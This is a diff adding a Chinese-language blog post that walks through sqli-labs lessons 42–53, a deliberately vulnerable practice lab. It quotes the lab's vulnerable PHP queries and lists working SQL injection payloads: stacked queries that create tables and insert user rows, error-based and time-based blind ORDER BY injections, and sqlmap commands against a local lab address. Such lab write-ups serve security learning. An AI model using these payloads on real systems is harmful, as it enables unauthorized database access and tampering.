@@ -1134,7 +1134,98 @@
   <entry>
     <title>sqli-labs4</title>
     <url>/posts/8ad9e0b5/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h3 id="42-堆叠注入"><a href="#42-堆叠注入" class="headerlink" title="42 堆叠注入"></a>42 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = mysqli_connect(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line">   </span><br><span class="line">... ... </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>只对username做了处理，对password没有处理</p>
+<p><code>login_user=admin&amp;login_password=1%27%3Bcreate+table+test44 like users%23&amp;mysubmit=Login</code></p>
+<br/>
+
+<h3 id="43-堆叠注入"><a href="#43-堆叠注入" class="headerlink" title="43 堆叠注入"></a>43 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = mysqli_connect(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$username</span>&#x27;) and password=(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>和上一关差不多，使用<code>&#39;)</code>闭合</p>
+<br/>
+
+<h3 id="44-堆叠注入"><a href="#44-堆叠注入" class="headerlink" title="44 堆叠注入"></a>44 堆叠注入</h3><p>和42一样</p>
+<br/>
+
+<h3 id="45-堆叠注入"><a href="#45-堆叠注入" class="headerlink" title="45 堆叠注入"></a>45 堆叠注入</h3><p>和43一样</p>
+<br/>
+
+<h3 id="46-order-by注入"><a href="#46-order-by注入" class="headerlink" title="46 order by注入"></a>46 <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>?sort=1%20desc</code>或者<code>?sort=1%20asc</code> 数据不同，可以使用报错注入</p>
+<p><code>?sort=1 updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
+<br/>
+
+<p>也可以使用时间盲注</p>
+<p><code>?sort=1 and if(1=1,sleep(1),0)</code>会响应一段时间</p>
+<p><code>?sort=1 and if(1=1,0,sleep(1))</code> 会即可得到信息</p>
+<br/>
+
+<br/>
+
+<h3 id="47-order-by注入"><a href="#47-order-by注入" class="headerlink" title="47  order by注入"></a>47  <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>?sort=1&#39; desc --+</code>   <code>?sort=1&#39; asc --+</code></p>
+<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
+<br/>
+
+<br/>
+
+<h3 id="48-order-by注入"><a href="#48-order-by注入" class="headerlink" title="48 order by注入"></a>48 <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以参考46</p>
+<p>这关没回显，考虑使用时间盲注</p>
+<br/>
+
+<p>SQlmap</p>
+<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-48/?sort=1  --technique T --batch --dbs</code></p>
+<br/>
+
+<h3 id="49-order-by注入"><a href="#49-order-by注入" class="headerlink" title="49 order by注入"></a>49 <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>?sort=1%27%20%20and%20sleep(1)--+</code>时间盲注</p>
+<br/>
+
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-49/?sort=1  --technique T --batch --dbs</code></p>
+<br/>
+
+<h3 id="50-order-by注入-amp-堆叠注入"><a href="#50-order-by注入-amp-堆叠注入" class="headerlink" title="50 order by注入&amp;堆叠注入"></a>50 <code>order by</code>注入&amp;堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">	<span class="comment">/* execute multi query */</span></span><br><span class="line">	<span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">	... ...</span><br></pre></td></tr></table></figure>
+
+<p>order by注入和堆叠注入</p>
+<p>数字型 可以使用时间盲注和报错注入</p>
+<p><code>?sort=1%20and%20sleep(1)</code></p>
+<p><code>?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
+<br/>
+
+<p>堆叠注入</p>
+<p><code>?sort=1;insert into users(id,username,password) values(&#39;50&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+<br/>
+
+<h3 id="51-order-by注入-amp-堆叠注入"><a href="#51-order-by注入-amp-堆叠注入" class="headerlink" title="51 order by注入&amp;堆叠注入"></a>51 <code>order by</code>注入&amp;堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>)) </span><br></pre></td></tr></table></figure>
+
+<p>报错注入</p>
+<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
+<br/>
+
+<p>堆叠注入</p>
+<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;51&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+<br/>
+
+<h3 id="52-order-by注入-amp-堆叠注入"><a href="#52-order-by注入-amp-堆叠注入" class="headerlink" title="52 order by注入&amp;堆叠注入"></a>52 <code>order by</code>注入&amp;堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<p>堆叠注入</p>
+<p><code>?sort=1;insert into users(id,username,password) values(&#39;52&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+<br/>
+
+<br/>
+
+<h3 id="53-order-by注入-amp-堆叠注入"><a href="#53-order-by注入-amp-堆叠注入" class="headerlink" title="53 order by注入&amp;堆叠注入"></a>53 <code>order by</code>注入&amp;堆叠注入</h3><p>堆叠注入</p>
+<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;53&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+]]></content>
       <categories>
         <category>SQLi</category>
       </categories>
